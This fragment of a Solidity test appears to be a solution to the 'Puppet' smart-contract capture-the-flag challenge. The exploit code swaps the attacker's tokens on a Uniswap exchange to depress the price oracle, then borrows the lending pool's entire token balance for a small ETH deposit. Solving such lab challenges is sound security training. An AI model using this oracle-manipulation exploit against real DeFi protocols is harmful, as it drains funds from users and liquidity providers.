...
contract Puppet is Test {
    ...
    function testExploit() public {
        ...
        uint256 amtOutETH = calculateTokenToEthInputPrice(ATTACKER_INITIAL_TOKEN_BALANCE, UNISWAP_INITIAL_TOKEN_RESERVE, UNISWAP_INITIAL_ETH_RESERVE);
        address(uniswapExchange).call(abi.encodeWithSignature("tokenToEthSwapOutput(uint256,uint256,uint256)", amtOutETH, ATTACKER_INITIAL_TOKEN_BALANCE, block.timestamp+1000));

        uint256 amtInETH  = puppetPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE);
        puppetPool.borrow{value: amtInETH}(POOL_INITIAL_TOKEN_BALANCE);
        /** EXPLOIT END **/
        validation();
    }
